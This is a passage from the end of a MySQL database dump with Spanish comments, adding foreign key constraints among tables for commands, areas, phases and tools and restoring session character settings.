  MODIFY `id_herramienta` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=53;

--
-- Restricciones para tablas volcadas
--

--
-- Filtros para la tabla `comandos`
--
ALTER TABLE `comandos`
  ADD CONSTRAINT `comandos_ibfk_1` FOREIGN KEY (`id_area`) REFERENCES `areas` (`id_area`) ON UPDATE CASCADE,
  ADD CONSTRAINT `comandos_ibfk_2` FOREIGN KEY (`id_fase`) REFERENCES `fases` (`id_fase`) ON UPDATE CASCADE,
  ADD CONSTRAINT `comandos_ibfk_3` FOREIGN KEY (`id_herramienta`) REFERENCES `herramientas` (`id_herramienta`) ON UPDATE CASCADE;

--
-- Filtros para la tabla `fases`
--
ALTER TABLE `fases`
  ADD CONSTRAINT `fases_ibfk_1` FOREIGN KEY (`id_area`) REFERENCES `areas` (`id_area`) ON UPDATE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
